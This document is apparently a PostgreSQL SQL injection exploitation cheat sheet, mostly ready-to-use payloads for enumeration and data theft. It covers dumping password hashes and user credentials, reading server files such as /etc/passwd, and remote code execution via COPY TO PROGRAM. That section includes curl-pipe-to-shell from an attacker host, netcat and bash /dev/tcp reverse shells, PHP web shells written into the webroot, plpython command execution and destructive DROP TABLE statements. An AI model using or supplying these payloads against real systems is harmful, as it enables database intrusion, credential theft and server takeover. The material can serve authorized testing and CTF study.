# PostgreSQL — full exploitation reference

Postgres is stricter than MySQL on types and quoting — a UNION slot
that expects text errors on `'5'` cast to int silently? No — it
*refuses*; plan `cast()`/string_agg accordingly. Everything
Postgres-specific goes here; channel mechanics in the channel files.

---

## 1. Fingerprint

```sql
version()                          -- 'PostgreSQL 15.4 on x86_64-pc-linux...'
current_user                       -- (no parens! also session_user, user)
current_database(), current_schema()
inet_server_addr(), inet_server_port()
pg_postmaster_start_time()
current_setting('data_directory')
current_setting('config_file')
pg_backend_pid()
```

Exists-only-on-Postgres: `version()`, `pg_sleep`, `pg_read_file`,
`generate_series`, `dblink`, `to_char`, `string_agg`, `::` cast
operator, dollar-quoting `$$..$$`.

Quick discriminating check vs MySQL:

```sql
' AND 'a'||'b'='ab'-- -            -- true on PG; false/err on MySQL
                                   -- unless PIPES_AS_CONCAT set
' AND 1=1::int-- -                 -- PG cast syntax
```

---

## 2. Catalog map

```sql
-- databases
SELECT datname FROM pg_database;
'~'||string_agg(datname,',')||'~' FROM pg_database

-- schemas
SELECT schema_name FROM information_schema.schemata;
SELECT nspname FROM pg_catalog.pg_namespace;

-- tables in a schema
SELECT tablename FROM pg_tables WHERE schemaname='public';
SELECT table_name FROM information_schema.tables
  WHERE table_schema='public';
-- include internal listing
SELECT relname FROM pg_class WHERE relkind='r';

-- columns
SELECT column_name,data_type FROM information_schema.columns
  WHERE table_name='users' AND table_schema='public';
SELECT attname,format_type(atttypid,atttypmod) FROM pg_attribute
  WHERE attrelid='public.users'::regclass AND attnum>0;

-- users/roles
SELECT usename,passwd FROM pg_shadow;              -- needs priv
SELECT usename,usecreatedb,usesuper FROM pg_user;
SELECT rolname,rolsuper,rolcreaterole,rolcreatedb,
  rolreplication,rolbypassrls FROM pg_roles;

-- functions (gadget hunting — CTF often hides custom SQL funcs)
SELECT proname,prosrc FROM pg_proc WHERE prolang=
  (SELECT oid FROM pg_language WHERE lanname='sql');
SELECT proname,prosrc FROM pg_proc WHERE proname NOT LIKE 'pg\_%';

-- views
SELECT viewname,definition FROM pg_views;
```

---

## 3. UNION extraction recipes

```sql
' UNION SELECT NULL,'~'||version()||'~',NULL-- -
' UNION SELECT NULL,'~'||current_user||'~',NULL-- -
' UNION SELECT NULL,'~'||current_database()||'~',NULL-- -

-- all tables one shot
' UNION SELECT NULL,string_agg(tablename,','),NULL
   FROM pg_tables WHERE schemaname='public'-- -

-- columns
' UNION SELECT NULL,string_agg(column_name||':'||data_type,','),NULL
   FROM information_schema.columns WHERE table_name='users'-- -

-- rows
' UNION SELECT NULL,string_agg(username||':'||password,','),NULL
   FROM users-- -
' UNION SELECT NULL,username||':'||password,NULL FROM users
   LIMIT 1-- -                                        -- one row form
```

Type gotchas:

- `||` binds tighter than `=`; int || text errors → `cast(id as text)`.
- `string_agg(x,',')` needs text args → wrap non-text:
  `string_agg(cast(x as text),',')`.
- NULLs drop silently from string_agg (good) but `a||NULL` is NULL
  (bad) → `coalesce(col,'')` or `concat()` (PG ≥ 9.1 concat exists
  and tolerates NULLs).
- `array_agg` + `array_to_string` alternates:
  `array_to_string(array_agg(table_name),',')`.

---

## 4. Error-based recipes

```sql
' AND CAST(version() AS int)-- -
' AND 1=CAST((SELECT string_agg(tablename,',') FROM pg_tables
   WHERE schemaname='public') AS int)-- -
' AND 1=CAST((SELECT usename FROM pg_user LIMIT 1) AS int)-- -
' AND (SELECT CAST(username||':'||password AS int) FROM users
   LIMIT 1)=1-- -
' AND 1=(SELECT 1 FROM users WHERE CAST(flag AS int)=1)-- -
```

Error echoes the value: `ERROR: invalid input syntax for type
integer: "PostgreSQL 15.4..."`.

---

## 5. Blind recipes

```sql
-- boolean
' AND LENGTH(current_database())>6-- -
' AND ASCII(SUBSTRING(current_database(),1,1))>100-- -
' AND ASCII(SUBSTR((SELECT usename FROM pg_user LIMIT 1),1,1))>77-- -

-- CASE wrapper (PG has no IF)
' AND (CASE WHEN LENGTH(current_database())>6 THEN true
   ELSE false END)-- -
' AND (CASE WHEN ASCII(SUBSTRING((SELECT datname FROM pg_database
   LIMIT 1),1,1))>100 THEN 1 ELSE 0 END)=1-- -

-- conditional error channel
' AND (SELECT CASE WHEN cond THEN CAST('x' AS int) ELSE 1 END)=1-- -

-- time (pg_sleep inside CASE — the reliable non-stacked form)
' AND (SELECT CASE WHEN ASCII(SUBSTRING(current_database(),1,1))>100
   THEN pg_sleep(3) ELSE pg_sleep(0) END) IS NULL-- -
'; SELECT pg_sleep(5)-- -                       -- stacked variant
-- CPU fallback
' AND (SELECT count(*) FROM generate_series(1,30000000))>0-- -
```

---

## 6. Stacked queries — actually common here

JDBC (PG), psycopg (Python), Npgsql (.NET) all allow `;`-separated
statements — Postgres is THE DBMS where stacked injection most often
works:

```sql
'; INSERT INTO log VALUES('pwned')-- -
'; CREATE TABLE pwn(x text)-- -
'; COPY users TO '/tmp/u'-- -
'; DROP TABLE logs-- -                    -- destructive: don't, unless lab
```

Result set of the second statement usually does NOT reach the page —
stacked PG is for writes, file ops, RCE — not for extraction (use
UNION/blind for that).

---

## 7. File read

```sql
-- superuser / pg_read_server_files role needed
' UNION SELECT NULL,pg_read_file('/etc/passwd'),NULL-- -
' UNION SELECT NULL,pg_read_file('/var/lib/postgresql/data/
   postgresql.conf'),NULL-- -
' UNION SELECT NULL,string_agg(x,''),NULL
   FROM pg_ls_dir('/etc')x-- -            -- directory listing!
' UNION SELECT NULL,string_agg(x,''),NULL
   FROM pg_ls_dir('/var/www')x-- -

-- COPY read (superuser, writes to client-side file — not useful
-- for extraction INTO page, but file WRITE is):
'; COPY users FROM '/etc/passwd'-- -      -- reads server file into table
'; CREATE TABLE t(x text); COPY t FROM '/etc/passwd'-- -
' UNION SELECT NULL,string_agg(x,chr(10)),NULL FROM t-- -
   -- two-step: copy file into table, then UNION it out
```

`pg_ls_dir`, `pg_read_file`, `pg_stat_file` — the most useful
non-SELECT trio; check role first:

```sql
' UNION SELECT NULL,current_setting('is_superuser'),NULL-- -
' UNION SELECT NULL,cast(current_user as text)||':'||
   cast(rolsuper as text),NULL FROM pg_roles
   WHERE rolname=current_user-- -
' UNION SELECT NULL,string_agg(rolname,','),NULL FROM pg_auth_members-- -
```

---

## 8. RCE — COPY TO PROGRAM (the crown jewel)

Superuser + `COPY ... TO PROGRAM` = straight RCE, no tricks:

```sql
'; COPY (SELECT '') TO PROGRAM 'id > /tmp/pw.txt'-- -
'; COPY (SELECT '') TO PROGRAM 'curl http://attacker/s.sh|sh'-- -
'; COPY (SELECT '') TO PROGRAM 'nc -e /bin/sh attacker 4444'-- -
'; COPY (SELECT '') TO PROGRAM 'bash -i >& /dev/tcp/10.0.0.5/4444 0>&1'-- -
```

Then read the output file if you kept it inside webroot:

```sql
'; COPY (SELECT '') TO PROGRAM 'id > /var/www/html/i.txt'-- -
-- browse to /i.txt
```

If `PROGRAM` is filtered (RDS/managed PG blocks it — Aurora/RDS run
you as non-superuser anyway), remaining paths:

```sql
-- large-object + lo_export write primitive
SELECT lo_import('/etc/passwd');             -- returns oid
SELECT lo_get(oid_from_above);
SELECT lo_export(oid,'/tmp/out');            -- write LO to disk
SELECT lo_from_bytea(0,'<?php system($_GET[c]);?>');
SELECT lo_export(new_oid,'/var/www/html/s.php');
```

`dblink` for lateral movement:

```sql
SELECT * FROM dblink('host=internal.db user=u password=p dbname=x',
   'select table_name from information_schema.tables')
   AS t(name text);
```

Extensions to check (any of these = escalation path):

```sql
SELECT name,default_version,installed_version FROM
  pg_available_extensions WHERE installed_version IS NOT NULL;
-- http        -> http_get/http_post = OOB HTTP
-- plpython3u  -> full python = RCE
-- plperlu     -> full perl   = RCE
-- pljava      -> jvm = RCE
-- postgres_fdw/dblink -> network pivot
```

```sql
-- plpython3u (if installed):
CREATE OR REPLACE FUNCTION pwn() RETURNS void AS $$
  import os; os.system('id > /tmp/x')
$$ LANGUAGE plpython3u; SELECT pwn();
```

---

## 9. Write a file without PROGRAM

`COPY ... TO 'file'` (superuser):

```sql
'; COPY (SELECT '<?php system($_GET["c"]); ?>') TO
   '/var/www/html/s.php'-- -
'; CREATE TABLE sh(x text); INSERT INTO sh VALUES
   ('<?php system($_GET["c"]); ?>'); COPY sh(x) TO
   '/var/www/html/s.php'-- -
```

`lo_from_bytea` + `lo_export` (§8) works without COPY syntax —
useful when `COPY` is keyword-filtered.

---

## 10. Quirks

- Dollar-quoting dodges quote filters entirely:
  `' UNION SELECT NULL,$$hello$$,NULL-- -` — no quotes needed.
- `chr(39)`/`chr(32)` build strings byte-wise inside expressions:
  `chr(117)||chr(115)||chr(101)||chr(114)` = 'user'.
- `E'...'` escape strings: `E'\\x41'` = 'A' — hex payloads inside
  E-strings bypass some sanitizers.
- Identifiers are case-insensitive UNLESS quoted — `users` ≠
  `"Users"`.
- `pg_sleep` in SELECT returns void → comparing it IS NULL is the
  trick (§5).
- `generate_series` doubles as a number generator AND a CPU burner.
- `::regclass` casts table name→oid fast: `'users'::regclass`.
- `row_to_json`/`to_json` dump whole rows as JSON — great for
  UNION single-column output:
  `' UNION SELECT NULL,row_to_json(users),NULL FROM users LIMIT 1-- -`
- `query_to_xml`, `table_to_xml` similar XML dump.
- `SELECT * FROM information_schema.enabled_roles` — quick role list.

---

## 11. Second-order specifics

- `LISTEN`/`NOTIFY` channels inside stored payloads — NOTIFY during
  a stored value fires on INSERT.
- Serial `nextval`/`currval` probing inside blind contexts.
- Trigger functions (`pg_trigger`) hide auto-run SQL — enumerate
  `pg_trigger` + `pg_proc` when the app defers inserts.

---

## 12. Quick diagnosis table

| Need | Statement |
|---|---|
| who am I | `current_user`, `session_user` |
| where am I | `current_database()`, `current_schema()` |
| superuser? | `current_setting('is_superuser')` = `on` |
| list tables | `pg_tables` / `information_schema.tables` |
| read file | `pg_read_file` / `COPY t FROM` |
| list dir | `pg_ls_dir(path)` |
| write file | `COPY (...) TO '/path'` / `lo_export` |
| RCE | `COPY (SELECT '') TO PROGRAM 'cmd'` |
| sleep | `pg_sleep(n)` inside CASE + `IS NULL` |
| error echo | `CAST(x AS int)` |
| OOB | `dblink`/extension http/plpython — else dead |
| rows as JSON | `row_to_json(t)` |
